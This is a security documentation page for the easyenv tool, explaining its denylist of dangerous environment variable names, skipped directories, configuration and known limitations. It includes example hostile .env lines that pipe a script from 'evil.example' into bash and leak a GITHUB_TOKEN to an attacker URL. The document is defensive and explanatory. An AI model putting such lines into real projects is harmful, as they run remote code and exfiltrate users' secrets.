# Security

easyenv has no per-directory trust step — unlike direnv, there's no `easyenv allow`. Every `.env` between your current directory and the filesystem root is applied automatically, including in a repository you just `git clone`d and haven't looked at yet. This page explains why that's a defensible design rather than a hand-wave, exactly what it protects against, and — just as importantly — what it doesn't.

## The trust model, stated plainly

"No trust step" is only safe if the *set of things a `.env` can express* is restricted to values that are inert on their own. A `.env` is just `KEY=value` pairs — there's no shell execution syntax in the file format itself, unlike direnv's `.envrc`, which is arbitrary shell. But that alone isn't enough: plenty of environment variable *names* have semantics that turn an inert-looking value into code execution, a redirected lookup, or a relaxed trust boundary the moment some other tool reads them. `PROMPT_COMMAND=curl evil.example/x.sh | bash` is a completely ordinary-looking `.env` line, and if it were applied unconditionally, the hook's own `eval` would run it in your live interactive shell on the very next prompt.

So easyenv maintains a **compiled-in denylist** of variable names it will never set from a `.env`, covering every mechanism that turns "set a variable" into "run code" or "redirect trust":

- **Shell execution and parsing**: `PROMPT_COMMAND`, `PS0`–`PS4`, `BASH_ENV`, `ENV`, `ZDOTDIR`, `IFS`, `HISTFILE`, and similar — names the shell itself acts on.
- **The dynamic loader**: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES` and friends — arbitrary code in every subsequent child process.
- **Tool invocation hijacking**: `EDITOR`, `PAGER`, `GIT_SSH_COMMAND`, `SUDO_ASKPASS`, `GIT_PAGER`, and similar — commands you'll eventually run yourself, redirected to something the `.env` chose.
- **TLS and network interception**: `http_proxy`/`https_proxy` (matched case-insensitively — tools honor both), `SSLKEYLOGFILE`, `NODE_TLS_REJECT_UNAUTHORIZED`, `CURL_CA_BUNDLE`, and similar.
- **Language runtime footguns**: `NODE_OPTIONS` (`--require ./evil.js`), `PYTHONBREAKPOINT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`, `GOTOOLCHAIN`, `R_PROFILE_USER`, and the equivalent for every commonly-installed runtime.
- **Cloud and infrastructure redirection**: `AWS_ENDPOINT_URL`, `KUBECONFIG`, `DOCKER_HOST`, `AZURE_CONFIG_DIR`, and similar — pointing a tool at attacker-controlled infrastructure instead of the real one.
- **easyenv's own config and state**: the `EASYENV_` prefix (so a `.env` can't forge its own state or flip its own settings) and `XDG_`/`HOME` (so a `.env` can't relocate the config file that governs it — see below).

The full, current list — organized by these same categories, with comments explaining *why* each entry is there — lives in [`src/config.rs`](https://github.com/Chris1221/easyenv/blob/main/src/config.rs). It's deliberately **not** a blanket "block anything that looks sensitive": names like `GIT_AUTHOR_NAME`, `AWS_REGION`, `AWS_PROFILE`, `NODE_ENV`, and `PYTHONUNBUFFERED` are common, legitimate, and inert, so they're explicitly permitted. A denylist that also blocks everything ordinary generates enough friction that people disable the feature entirely — which is the real failure mode for a security default.

Deny/allow rules match by exact name or a trailing-`*` prefix, always **anchored from the start of the string** — `MY_PATH` and `PATHOLOGY` are never confused with `PATH`, and a rule can never widen into a substring match by accident.

Directories are handled the same way: `.env` files inside `/tmp`, `/var/tmp`, `/dev/shm` (world-writable — any local user on a shared machine could plant one), mounted/removable media (`/mnt`, `/media`, `/Volumes`), `~/Downloads`/`~/Desktop` (where extracted archives land), and system directories (`/etc`, `/usr`, `/var`, and similar) are never collected — though the upward walk still continues *past* them, so a legitimate `.env` further up the tree still applies. Anything inside a vendored-dependency directory (`node_modules`, `.venv`, `vendor`, `target`, and similar, matched as an exact path component) is skipped the same way: a `.env` inside a downloaded dependency was never something you wrote.

## Configuring the policy

The compiled-in lists above are defaults, not the whole story — you can extend or narrow them in `$XDG_CONFIG_HOME/easyenv/config.toml` (falling back to `~/.config/easyenv/config.toml`):

```toml
[env]
# Added to the denylist, on top of the compiled-in defaults.
deny_extra = ["MY_INTERNAL_TOKEN", "COMPANY_*"]

# Removed from the denylist -- reintroduces the underlying risk for
# exactly these names. Use this if you genuinely need, say,
# AWS_ENDPOINT_URL for LocalStack/MinIO.
allow = ["AWS_ENDPOINT_URL"]

[dirs]
# Added to the skip list.
skip_extra = ["~/Sync"]

# Removed from the skip list.
unskip = ["~/Downloads"]
```

`allow`/`unskip` always win over both the compiled-in defaults and `deny_extra`/`skip_extra`, so you can always get back to unrestricted behavior for a specific name or directory if you mean to. Run `easyenv status` in any directory to see exactly which keys are active, which are denied, and where each one came from:

```console
$ easyenv status
Active .env files for /home/you/project (root-first):
  /home/you/project/.env

Resolved variables:
  DATABASE_URL=postgres://...  (from /home/you/project/.env)
  PATH=/opt/bin  (from /home/you/project/.env) [DENIED: see docs/reference/security.md]
```

**A malformed config file fails closed**, never open: if `config.toml` doesn't parse, `easyenv export` warns on stderr and falls back to the compiled-in defaults (never "no restrictions"), and `easyenv status` treats it as a hard error so you notice. The config file's own location is resolved once, from the process environment only, and is never influenced by anything in a `.env` — which is exactly why `XDG_CONFIG_HOME` and `HOME` are on the denylist: a `.env` that could relocate `config.toml` could relocate the file that constrains it.

## What this does *not* protect against

A denylist is honest about being a denylist. The claim easyenv can defensibly make is **"a hostile `.env` cannot execute code through any currently-known mechanism"** — not "cannot do anything." A few things worth knowing, in descending order of how likely you are to actually hit them:

**`.env` values are substituted, not fully literal.** `dotenvy` (the parser easyenv uses) expands `$VAR` and `${VAR}` in unquoted and double-quoted values — it checks your real process environment first, then falls back to earlier keys in the same file. Only **single-quoted** values (`FOO='$BAR'`) are truly literal. This means a `.env` line like `SENTRY_DSN=https://evil.example/${GITHUB_TOKEN}` will copy an ambient secret you already had into a value that gets sent to attacker-controlled infrastructure the next time some tool reads `SENTRY_DSN` — the denylist doesn't catch this, since `SENTRY_DSN` itself is an ordinary, inert-looking name. If you're reviewing an unfamiliar `.env`, a reference to a variable name it has no obvious reason to need is worth a second look.

**Shadowed prior values are exposed in `EASYENV_STATE`.** If a `.env` sets a key you already had a value for (say, your own `GITHUB_TOKEN`, overridden by a project's `.env`), easyenv remembers your original value so it can restore it on `cd` out — and that value currently lives, base64-encoded, in the `EASYENV_STATE` environment variable, which is exported and therefore inherited by every child process, including build scripts in the same untrusted repository whose `.env` triggered the shadowing. It can also turn up in crash reports, `printenv` output pasted into a support ticket, or tmux/`ssh -o SendEnv` session inheritance. Base64 isn't encryption — it defeats naive secret-scanning but not a deliberate look. Moving this out of the environment entirely (into a file, with just a pointer left in `EASYENV_STATE`) is a planned follow-up; for now, avoid keeping long-lived secrets in ambient shell variables that a project's `.env` might plausibly redefine.

**Blocklists rot.** New language runtimes and CLIs keep inventing new magic variables — `GOTOOLCHAIN`, `GIT_CONFIG_COUNT`, and the `UV_*` family are all comparatively recent additions to the *kind* of thing this list has to track. The policy behind the list — deny anything that can run code, redirect a lookup, or relax a trust boundary; permit anything that only selects among resources you already control; when in doubt, deny — is documented here so future additions are a decidable question rather than an ad hoc one, but the list itself will never be complete. If you find a name that should be denied by default and isn't, please [open an issue](https://github.com/Chris1221/easyenv/issues).

## Practical advice

- **Don't put real secrets in an ancestor `.env`** that every descendant directory inherits — including repositories you clone just to read the code. Keep secrets in the `.env` closest to where they're actually used, not in a shared parent.
- **Add internal tool names to `deny_extra`** if you have your own sensitive environment variables (an internal deploy token, say) that you'd never want a compromised dependency's `.env` to set.
- **Review unfamiliar `.env` files the same way you'd review any other file in a repo you don't control.** The denylist closes known exploitation *classes* — it doesn't vet the *content* of what's left.

See also: [How it works](how-it-works.md) for the shell-hook and diff/state design, and [the FAQ](faq.md) for the `$VAR` substitution behavior in more detail.
